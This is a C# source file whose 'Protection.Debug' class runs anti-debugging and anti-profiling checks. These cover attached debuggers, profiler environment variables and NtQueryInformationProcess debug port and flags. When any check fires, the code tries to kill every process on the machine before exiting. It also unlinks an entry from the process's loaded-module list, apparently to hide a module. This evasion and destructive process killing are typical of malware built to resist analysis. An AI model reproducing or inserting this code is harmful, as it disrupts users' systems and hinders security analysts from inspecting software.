﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Protection
{
    internal static class Debug
    {
        [DllImport("ntdll.dll", CharSet = CharSet.Auto)]
        public static extern int NtQueryInformationProcess(IntPtr test, int test2, int[] test3, int test4, ref int test5);
        public async static void Initialize()
        {

            if (Debugger.IsLogging())
            {
                Thread.Sleep(120);
                Process[] processess = Process.GetProcesses();

                foreach (var process in processess)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                        process.Kill();
                    }
                    catch
                    {
                    }

                }
                Environment.Exit(0); 
            }
            if (Debugger.IsAttached)
            {
                Thread.Sleep(120);
                Process[] processess = Process.GetProcesses();

                foreach (var process in processess)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                        process.Kill();
                    }
                    catch
                    {
                    }

                }
                Environment.Exit(0); }

            if (Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null)
            {
                Thread.Sleep(120);
                Process[] processess = Process.GetProcesses();

                foreach (var process in processess)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                        process.Kill();
                    }
                    catch
                    {
                    }

                }
                Environment.Exit(0); }
            if (string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0)
            {
                Thread.Sleep(120);
                Process[] processess = Process.GetProcesses();

                foreach (var process in processess)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                        process.Kill();
                    }
                    catch
                    {
                    }

                }
                Environment.Exit(0); }

            if (Environment.OSVersion.Platform != PlatformID.Win32NT) return;
            var array = new int[6];
            var num = 0;
            var intPtr = Process.GetCurrentProcess().Handle;
            if (NtQueryInformationProcess(intPtr, 31, array, 4, ref num) == 0 && array[0] != 1)
            {
                Thread.Sleep(120);
                Process[] processess = Process.GetProcesses();

                foreach (var process in processess)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                        process.Kill();
                    }
                    catch
                    {
                    }

                }
                Environment.Exit(0);
            }
            if (NtQueryInformationProcess(intPtr, 30, array, 4, ref num) == 0 && array[0] != 0)
            {
                Thread.Sleep(120);
                Process[] processess = Process.GetProcesses();

                foreach (var process in processess)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                        process.Kill();
                    }
                    catch
                    {
                    }

                }
                Environment.Exit(0);
            }

            if (NtQueryInformationProcess(intPtr, 0, array, 24, ref num) != 0) return;
            intPtr = Marshal.ReadIntPtr(Marshal.ReadIntPtr((IntPtr)array[1], 12), 12);
            Marshal.WriteInt32(intPtr, 32, 0);
            var intPtr2 = Marshal.ReadIntPtr(intPtr, 0);
            var ptr = intPtr2;
            do
            {
                ptr = Marshal.ReadIntPtr(ptr, 0);
                if (Marshal.ReadInt32(ptr, 44) != 1572886 ||
                    Marshal.ReadInt32(Marshal.ReadIntPtr(ptr, 48), 0) != 7536749) continue;
                var intPtr3 = Marshal.ReadIntPtr(ptr, 8);
                var intPtr4 = Marshal.ReadIntPtr(ptr, 12);
                Marshal.WriteInt32(intPtr4, 0, (int)intPtr3);
                Marshal.WriteInt32(intPtr3, 4, (int)intPtr4);
            }
            while (!ptr.Equals(intPtr2));
        }
    }
}